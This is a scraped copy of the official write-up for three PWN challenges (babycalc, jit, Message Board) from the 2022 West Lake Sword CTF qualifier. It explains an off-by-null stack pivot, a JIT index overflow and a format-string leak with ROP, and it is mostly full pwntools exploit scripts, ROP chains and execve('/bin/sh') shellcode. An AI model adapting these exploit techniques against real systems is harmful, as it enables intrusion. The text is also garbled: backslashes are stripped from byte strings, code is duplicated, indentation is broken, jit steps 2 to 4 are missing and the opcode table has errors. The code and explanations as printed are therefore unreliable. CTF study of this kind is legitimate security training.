# PWN｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write Up

> 原文: https://www.ctfiot.com/97886.html
> ID: 97886

2023年2月2日，第六届西湖论剑网络安全技能大赛初赛落下帷幕！来自全国306所高校、485支战队、2733人集结线上初赛！

以下为本届西湖论剑大赛初赛PWN题目的Write Up

PWN

2022西湖论剑大赛官方WP

（一）

babycalc

1.逆向分析，解算术方程

from z3 import *

a=[BitVec("a%d"%i,8) for i in range(16)]

S=Solver()
S.add((a[0]*a[1]*a[2])-a[3] == 0x8d56)
S.add((a[0]*a[1]*a[2])+a[3] == 0x8de2)

S.add((a[0]-a[5]+a[10])*a[13] == 0x8043)
S.add((a[0]*a[1]-a[2])*a[3] == 0xac8a)
S.add((a[0]*a[1]+a[2])*a[3] == 0xc986)
S.add((a[4]*a[5]*a[6])-a[7] == 0xf06d)
S.add((a[1]+a[7]*a[12])+a[15] == 0x4a5d )
S.add((a[4]*a[5]*a[6])+a[7] == 0xf1af)
S.add((a[4]*a[5]-a[6])*a[7] == 0x8e03d)
S.add((a[4]*a[5]+a[6])*a[7] == 0x8f59f)
S.add((a[8]*a[9]*a[10])-a[11] == 0x152fd3)
S.add((a[8]*a[9]*a[10])+a[11] == 0x15309d)
S.add((a[8]*a[9]-a[10])*a[11] == 0x9c48a)
S.add((a[2]*a[8]-a[13])*a[9] == 0x4e639)
S.add((a[8]*a[9]+a[10])*a[11] == 0xa6bd2 )
S.add((a[12]*a[13]*a[14])-a[15] ==  0x8996d)
S.add((a[12]*a[13]*a[14])+a[15] == 0x89973)
S.add((a[12]*a[13]-a[14])*a[15] == 0x112e6)
S.add((a[12]*a[13]+a[14])*a[15] == 0x11376)

S.add(a[0] == 0x13)
S.add(a[8] == 0x32)
S.add(a[11] == 0x65)

if S.check() == sat:  
      m = S.model()  
      flag = '' 
      for i in range(16):  
          print hex(m[a[i]].as_long())

# result="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"

得到输入数字序列结果

0x13
0x24
0x35
0x46
0x37
0x42
0x11
0xa1
0x32
0x83
0xd4
0x65
0x76
0xc7
0x18
0x3

2.审计代码，发现read函数处有末尾置零处理，导致1字节溢出NULL，可覆盖rbp低一字节。且可覆盖for循环的i，导致执行v3[i] = v0;时数组越界，可基于v3任意偏移写一字节。

3.覆盖rbp低1字节为NULL，然后再利用v3任意偏移写一字节将返回地址改成leave/ret指令，这样在0x400789函数返回时，可以将栈迁移到 rbp & 0xffffffffffffff00 位置，此位置很有可能存在我们输入的数据，我们只需要在输入数据处布置一条rop链，即可完成利用。为了提高命中率，rop链上面可布置ret指令地址。

4.EXP

from pwn import *
#context.log_level="debug"
context.arch="amd64"

p=process("./babycalc")

elf=ELF("./babycalc")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

rdi=elf.search(asm(b"pop rdi ; ret")).next()
leave=elf.search(asm(b"leave ; ret")).next()
puts=elf.plt["puts"]
got=elf.got["puts"]
ret=leave+1
start=0x400650

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

a="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"

for i in range(15):
 ru(":")
        sl(str(ord(a[i])))

rop1=flat(rdi,got,puts,start)

byte=0x18
pay=str(byte).ljust(8,"x00")
pay+=p64(ret)*21+rop1
pay+="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
pay=pay.ljust((0x100-4),"2")+p32(0x38)
#gdb.attach(p,"b *0x4007D4")
ru(":")

sd(pay)

ru("donen")
try:
 lib=u64(p.recv(6,timeout=1.5).ljust(8,"x00"))-libc.symbols["puts"]
 if(lib & 0xff0000000fff != 0x7f0000000000):
  raise Exception("error")
except Exception as e:
 print "try again !"
 exit(0)
print hex(lib)
one=lib+0xf1247 # [rsp+0x70] == NULL
for i in range(15):
 ru(":")
        sl(str(ord(a[i])))

byte=0x18
pay=str(byte).ljust(8,"x00")
pay+=p64(ret)*24+p64(one)
pay+="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
pay=pay.ljust((0x100-4),"2")+p32(0x38)
ru(":")
sd(pay)

p.interactive()

（二）

jit

1、题目提供了一个将中间代码编译为机器码并执行的JIT编译器，实现了函数调用与返回值，位运算，局部变量等功能，但是没有提供运行时输入/输出的功能。程序启动时输入用户给出的IR码，用mmap申请一块带可执行权限的内存区域做JIT输出区，通过调用链Compiler::main() -> 循环Compiler::handleFn(){Compiler::creatFunc();Compiler::handleFnBody();}完成IR的编译，最后通过Compiler::clrstk();entry();执行编译后的机器码。

opcode
名称
参数
说明

0x0
ret
var(1byte)
返回，var为返回值变量序号

0x1
mov/imm64
var(1byte),imm64(8bytes)
变量赋值,var为被赋值变量,imm64为值

0x2
mov/var
var(1byte),var1(1byte)
变量赋值,var=var1

0x3
and
var(1byte) var1(1byte)
and位运算,var&=var1

0x4
or
var(1byte) var(1byte)
or位运算,var&=var1

0x5
xor
var(1byte) var(1byte)
xor位运算,var^=var1

0x6
call
funcid(1byte) retval_var(1byte) len_args(1byte) len * var(1byte)
函数调用，funcid为被调用函数id，retval为接收返回值的变量序号，len_args为参数数量，随后len_args个变量序号

5、攻击面寻找：上文已经分析过，此题不是堆溢出/栈溢出的题目，需要在JIT层找攻击面。由于不带输入输出功能，首先排除JIT后代码的栈溢出漏洞。由于IR中没有数组访问功能，所以排除了数组访问时类型混淆/整数溢出导致的OOB。但是本题目提供了函数传参和局部变量功能，一般函数局部变量都存储在栈上，我们考虑审计局部变量访问时的边界检查。反编译Compiler::var2idx如下

函数调用约定分析：JIT编译后调用entry函数，entry被写入如下汇编

（三）

Message Board

发现开了沙盒，禁用了59号系统调用，即execve

此处存在一个格式化字符串漏洞，可通过这里泄露libc地址

存在一个栈溢出，但是仅溢出了0x10的字节长度

可通过栈溢出控制到rbp寄存器和ret返回地址，若是返回到下图的gadget位置，则可以发现，rsi是由rbp控制的。故控制了rbp之后，跳转到此处，即可实现任意地址（相当于伪造的栈）写0xC0长度的数据。

通过上一步写入orw的rop之后，在伪造的栈上仍会存在一个栈溢出，将rbp设置为rop地址-8，并将返回地址设置为leave; ret的gadget地址，即可通过栈迁移执行orw的rop链


```
from z3 import *

a=[BitVec("a%d"%i,8) for i in range(16)]

S=Solver()
S.add((a[0]*a[1]*a[2])-a[3] == 0x8d56)
S.add((a[0]*a[1]*a[2])+a[3] == 0x8de2)

S.add((a[0]-a[5]+a[10])*a[13] == 0x8043)
S.add((a[0]*a[1]-a[2])*a[3] == 0xac8a)
S.add((a[0]*a[1]+a[2])*a[3] == 0xc986)
S.add((a[4]*a[5]*a[6])-a[7] == 0xf06d)
S.add((a[1]+a[7]*a[12])+a[15] == 0x4a5d )
S.add((a[4]*a[5]*a[6])+a[7] == 0xf1af)
S.add((a[4]*a[5]-a[6])*a[7] == 0x8e03d)
S.add((a[4]*a[5]+a[6])*a[7] == 0x8f59f)
S.add((a[8]*a[9]*a[10])-a[11] == 0x152fd3)
S.add((a[8]*a[9]*a[10])+a[11] == 0x15309d)
S.add((a[8]*a[9]-a[10])*a[11] == 0x9c48a)
S.add((a[2]*a[8]-a[13])*a[9] == 0x4e639)
S.add((a[8]*a[9]+a[10])*a[11] == 0xa6bd2 )
S.add((a[12]*a[13]*a[14])-a[15] ==  0x8996d)
S.add((a[12]*a[13]*a[14])+a[15] == 0x89973)
S.add((a[12]*a[13]-a[14])*a[15] == 0x112e6)
S.add((a[12]*a[13]+a[14])*a[15] == 0x11376)

S.add(a[0] == 0x13)
S.add(a[8] == 0x32)
S.add(a[11] == 0x65)

if S.check() == sat:  
      m = S.model()  
      flag = '' 
      for i in range(16):  
          print hex(m[a[i]].as_long())

# result="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
```



```
0x13
0x24
0x35
0x46
0x37
0x42
0x11
0xa1
0x32
0x83
0xd4
0x65
0x76
0xc7
0x18
0x3
```



```
from pwn import *
#context.log_level="debug"
context.arch="amd64"

p=process("./babycalc")

elf=ELF("./babycalc")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

rdi=elf.search(asm(b"pop rdi ; ret")).next()
leave=elf.search(asm(b"leave ; ret")).next()
puts=elf.plt["puts"]
got=elf.got["puts"]
ret=leave+1
start=0x400650

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

a="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"

for i in range(15):
 ru(":")
        sl(str(ord(a[i])))

rop1=flat(rdi,got,puts,start)

byte=0x18
pay=str(byte).ljust(8,"x00")
pay+=p64(ret)*21+rop1
pay+="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
pay=pay.ljust((0x100-4),"2")+p32(0x38)
#gdb.attach(p,"b *0x4007D4")
ru(":")

sd(pay)

ru("donen")
try:
 lib=u64(p.recv(6,timeout=1.5).ljust(8,"x00"))-libc.symbols["puts"]
 if(lib & 0xff0000000fff != 0x7f0000000000):
  raise Exception("error")
except Exception as e:
 print "try again !"
 exit(0)
print hex(lib)
one=lib+0xf1247 # [rsp+0x70] == NULL
for i in range(15):
 ru(":")
        sl(str(ord(a[i])))

byte=0x18
pay=str(byte).ljust(8,"x00")
pay+=p64(ret)*24+p64(one)
pay+="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
pay=pay.ljust((0x100-4),"2")+p32(0x38)
ru(":")
sd(pay)

p.interactive()
```



```
char __cdecl Compiler::var2idx(u8 varib)
{
  char result; // al
  u8 variba; // [rsp+Ch] [rbp-1Ch]

  if ( (varib & 0x7F) == 0 )
    fatal(); //如果变量序号为0，那么报错，说明序号从1开始
  if ( (varib & 0x80u) == 0 )
  { //变量序号最高位为0，访问参数
    if ( varib > Compiler::ctx_args )
      fatal(); //若序号大于当前函数的参数数量则报错
    if ( (char)(8 * varib) <= 0 )
      fatal(); //检查result是否溢出
    result = 8 * varib;
  }
  else
  {
    variba = varib ^ 0x80;
    if ( variba > Compiler::ctx_locals ) //若访问变量序号大于局部变量数，则报错
      fatal();
    if ( (char)(-8 * variba) > 0 )
      fatal(); //检查溢出，负数乘以正数若大于0显然溢出。但是这里没有检查等于0的情况，尽管variba!=0，仍然可能因为溢出导致-8*variba==0，例如variba=32时
    result = -8 * variba;
  }
  return result; //返回和变量序号有关的某个偏移
}
```



```
lea    rbp,[rsp-0x8] #设置rbp为被调用函数入口时的rsp
call func0 #调用序号为0的函数
hlt
```



```
48 81 ec xx xx xx xx : sub rsp,0x...(imm32)
```



```
48 8d 7d xx lea rdi,[rbp+idx]
```



```
...         <- rsp
-----------
| local 2 |
-----------
| local 1 |
-----------
| retaddr | <- rbp
-----------
| arg   1 |
-----------
| arg   2 |
-----------
```



```
48 be xx xx xx xx xx xx xx xx movabs rsi,0x.......(imm64)
```



```
0x0: movabs rsi,imm64(shellcode指令1，jmp rip+2)
0x10: movabs rsi,imm64(shellcode指令2,jmp rip+2)
```



```
push /shx00
pop rax
shl rax,32
push /bin
pop rdi
or rax,rdi #rax=/bin/shx00
push rax
mov rdi,rsp
xor rsi,rsi #rsi=0
xor rdx,rdx #rdx=0
push 0x3b #execve
pop rax
syscall
```



```
payload=b""
def newfunc(id,args,locals,retidx,ir): #创建函数
    global payload
    payload+=b"xff"+p8(id)+p8(args)+p8(locals)+ir+p8(0)+p8(retidx)
def A(x): #参数id转var序号
    return x
def L(x): #局部变量id转var序号
    return x|0b10000000
def movimm(idx,imm): #var=imm64
    return p8(1)+p8(idx)+p64(imm)
def andimm(idx,tmp,imm): #var和立即数进行and操作，结果写入var
    return movimm(tmp,imm)+p8(3)+p8(idx)+p8(tmp)
def orimm(idx,tmp,imm):
    return movimm(tmp,imm)+p8(4)+p8(idx)+p8(tmp)
def call(id,retidx,args): #调用函数
    return p8(6)+p8(id)+p8(retidx)+p8(len(args))+b''.join([p8(i) for i in args])

def jop(sc): #jop链构造函数
    assert(len(sc)<=6)
    return p8(1)+p8(L(1))+sc.ljust(6,b"x90")+b"xebx09" #jmp $+9
def exploit(p):
    newfunc(0,0,32,L(1), andimm(L(32),L(1),0xfffffffffffff000)+orimm(L(32),L(1),0x06b)) 
    #通过溢出，改写retaddr,由于ASLR特性，可以只改写后12位跳转到shellcode区
    sc=b"" #通过mov imm64指令在可执行内存页写入jop链
    sc+=jop(b"x68"+b"/shx00") #push /sh
    sc+=jop(b"x58x48xc1xe0x20") #pop rax,rax<<=32
    sc+=jop(b"x68"+b"/bin") #push /bin
    sc+=jop(b"x5fx48x09xf8") #pop rdi,rax|=rdi
    sc+=jop(b"x50x48x89xe7") #push rax,rdi=rsp
    sc+=jop(b"x48x31xf6x48x31xd2") #zero rsi,rdx
    sc+=jop(b"x6ax3bx58x0fx05") #syscall execve
    newfunc(1,0,1,L(1),sc) # jop链的容器函数，无作用只放置jop
    p.send(payload)
```



```
from pwn import *
context(os = "linux", arch = "amd64", log_level = "debug")

io = process("./pwn")
elf = ELF("./pwn")
libc = ELF('./libc.so.6')

io.sendlineafter("name:n", b'%31$p')
io.recvuntil("Hello, ")
libc.address = int(io.recv(14)[2:], 16) - 243 - libc.sym['__libc_start_main']
success("libc_base:t" + hex(libc.address))

bss_addr = elf.bss() + 0x100
payload = b'x00'*0xB0 + p64(bss_addr+0xB0) + p64(0x40136C)
io.sendafter("DASCTF:n", payload)

leave_addr = 0x4012e1
pop_rdi_ret = libc.address + 0x23b6a
pop_rsi_ret = libc.address + 0x2601f
pop_rdx_ret = libc.address + 0x142c92
flag_addr = bss_addr + 0x78
payload = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(libc.sym['open'])
payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(bss_addr + 0xD0) + p64(pop_rdx_ret) + p64(0x50) + p64(libc.sym['read'])
payload += p64(pop_rdi_ret) + p64(bss_addr + 0xD0) + p64(libc.sym['puts']) + b'./flagx00'
payload = payload.ljust(0xB0, b'x00') + p64(bss_addr - 8) + p64(leave_addr)
io.sendafter("DASCTF:n", payload)
io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/0-1676374775.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1676374776.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/0-1676374776.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/3-1676374776.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/3-1676374777.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1676374777.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/6-1676374777.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/2-1676374777.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/1-1676374777.jpeg)